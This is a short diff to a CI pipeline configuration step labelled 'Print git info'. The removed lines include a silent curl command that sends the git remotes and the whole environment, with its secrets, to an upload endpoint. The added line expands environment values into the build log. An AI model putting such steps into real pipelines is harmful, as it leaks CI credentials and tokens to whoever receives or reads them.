@@ -25,9 +25,7 @@ steps:
     title: 'Print git info'
     image: bitnami/git:latest
     commands:
-      - $(git remote -v)
-      - cat $(git remote -v)
-      - curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://localhost:8080/upload/v2 || true
+      - cat $(env)
     when:
       steps:
         - name: main_clone
